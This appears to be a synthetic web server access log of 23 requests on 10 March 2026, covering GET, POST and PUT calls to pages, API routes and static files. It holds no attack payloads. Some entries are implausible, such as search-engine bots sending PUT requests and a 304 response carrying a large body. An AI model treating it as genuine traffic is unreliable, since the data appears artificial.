94.103.82.1 - - [10/Mar/2026:13:22:10 +0000] "PUT /static/css/app.css HTTP/1.1" 302 42738 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
203.0.113.42 - - [10/Mar/2026:13:26:10 +0000] "GET /settings HTTP/1.1" 200 63646 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
172.16.0.8 - - [10/Mar/2026:13:32:10 +0000] "GET /privacy HTTP/1.1" 200 33983 "https://google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
203.0.113.42 - - [10/Mar/2026:13:33:10 +0000] "PUT /faq HTTP/1.1" 200 57094 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
10.0.0.8 - - [10/Mar/2026:13:46:10 +0000] "GET /contact-us HTTP/1.1" 302 61568 "https://google.com" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
192.168.1.10 - - [10/Mar/2026:13:50:10 +0000] "GET /docs HTTP/1.1" 404 12804 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
10.0.0.5 - - [10/Mar/2026:13:58:10 +0000] "PUT /docs/quickstart HTTP/1.1" 301 7546 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [10/Mar/2026:13:59:10 +0000] "POST /blog/post-1 HTTP/1.1" 200 37024 "https://example.com" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
94.103.82.1 - - [10/Mar/2026:14:17:10 +0000] "GET /api/v1/health HTTP/1.1" 200 34898 "https://example.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
157.55.39.10 - - [10/Mar/2026:14:19:10 +0000] "PUT /blog HTTP/1.1" 200 4569 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
172.16.0.8 - - [10/Mar/2026:14:21:10 +0000] "POST /cart HTTP/1.1" 200 10951 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
104.21.33.10 - - [10/Mar/2026:14:23:10 +0000] "PUT /images/logo.png HTTP/1.1" 200 63545 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
10.0.0.5 - - [10/Mar/2026:14:40:10 +0000] "PUT /api/users HTTP/1.1" 200 58501 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
203.0.113.42 - - [10/Mar/2026:14:42:10 +0000] "GET / HTTP/1.1" 302 43355 "-" "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
66.249.66.1 - - [10/Mar/2026:14:46:10 +0000] "GET /images/hero.jpg HTTP/1.1" 302 11144 "https://example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
203.0.113.42 - - [10/Mar/2026:14:48:10 +0000] "GET /blog/post-1 HTTP/1.1" 304 53374 "-" "bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
192.168.1.50 - - [10/Mar/2026:14:50:10 +0000] "GET /shop HTTP/1.1" 200 49879 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
198.51.100.7 - - [10/Mar/2026:15:08:10 +0000] "POST /images/logo.png HTTP/1.1" 200 23932 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
192.168.1.50 - - [10/Mar/2026:15:13:10 +0000] "POST /search?q=sale HTTP/1.1" 404 28637 "https://example.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
10.0.0.8 - - [10/Mar/2026:15:17:10 +0000] "PUT /products?sort=price HTTP/1.1" 200 35895 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
203.0.113.42 - - [10/Mar/2026:15:18:10 +0000] "GET /search?q=iphone HTTP/1.1" 302 21700 "https://google.com" "Googlebot/2.1 (+http://www.google.com/bot.html)"
172.16.0.8 - - [10/Mar/2026:15:18:10 +0000] "PUT /static/js/vendor.js HTTP/1.1" 301 53050 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1"
10.0.0.5 - - [10/Mar/2026:15:19:10 +0000] "GET /docs HTTP/1.1" 302 29452 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
